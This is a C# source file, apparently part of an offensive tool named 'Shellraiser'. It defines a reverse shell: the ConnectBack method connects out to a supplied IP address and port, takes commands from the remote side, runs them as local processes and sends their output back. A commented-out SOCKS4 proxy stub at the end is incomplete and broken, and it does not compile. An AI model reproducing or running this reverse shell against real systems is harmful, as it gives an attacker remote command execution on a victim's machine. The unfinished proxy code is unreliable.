using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Shellraiser
{
	public class TCPReverse
	{
        private string iPAddress;
        private object port;

        public TCPReverse(string iPAddress, object port)
        {
            this.iPAddress = iPAddress;
            this.port = port;
        }

        // Let's make the method take IPAddress and Port, we will make these variables from parsing the args
        public static void ConnectBack(string IPAddress, int Port)
		{
			using (TcpClient client = new TcpClient(IPAddress, Port))
			{
				using (Stream stream = client.GetStream())
				{
					using (StreamReader rdr = new StreamReader(stream))
					{
						while (true)
						{
							string cmd = rdr.ReadLine();

							if (string.IsNullOrEmpty(cmd))
							{
								rdr.Close();
								stream.Close();
								client.Close();
								return;
							}

							if (string.IsNullOrWhiteSpace(cmd))
								continue;

							string[] split = cmd.Trim().Split(' ');
							string filename = split.First();
							string arg = string.Join(" ", split.Skip(1));

							try
							{
								Process prc = new Process();
								prc.StartInfo = new ProcessStartInfo();
								prc.StartInfo.FileName = filename;
								prc.StartInfo.Arguments = arg;
								prc.StartInfo.UseShellExecute = false;
								prc.StartInfo.RedirectStandardOutput = true;
								prc.Start();
								prc.StandardOutput.BaseStream.CopyTo(stream);
								prc.WaitForExit();
							}
							catch
							{
								string error = "Error running command " + cmd + "\n";
								byte[] errorBytes = Encoding.ASCII.GetBytes(error);
								stream.Write(errorBytes, 0, errorBytes.Length);
							}
						}
					}
				}
			}
		}
	}











	/*    public class Socks4Proxy
		{
			private readonly int _bindPort;
			private readonly IPAddress _bindAddress;

			public Socks4Proxy(IPAddress bindAddress = null, int bindPort = 1080)
			{
				_bindPort = bindPort;
				_bindAddress = bindAddress ?? IPAddress.Any;
			}

			private readonly CancellationTokenSource _tokenSource = new();
			public async Task Start()
			{
				var listener = new TcpListener(_bindAddress, _bindPort);
				listener.Start(100);

				while (!_tokenSource.IsCancellationRequested)
				{
					// this blocks until a connection is received or token is cancelled
					var client = await listener.AcceptTcpClientAsync(_tokenSource.Token);

					var thread = new Thread(async () => await HandleClient(client));
					thread.Start();

					private async Task HandleClient(TcpClient client)
					{
						// read data from client
						var data = await client.ReceiveData(_tokenSource.Token);

						// read the first byte, which is the SOCKS version
						int v = Convert.ToInt32(data[0]);
						var version = v;
					}
				}

				listener.Stop();
			}

			public void Stop()
			{
				_tokenSource.Cancel();
			}
		}
	*/



}
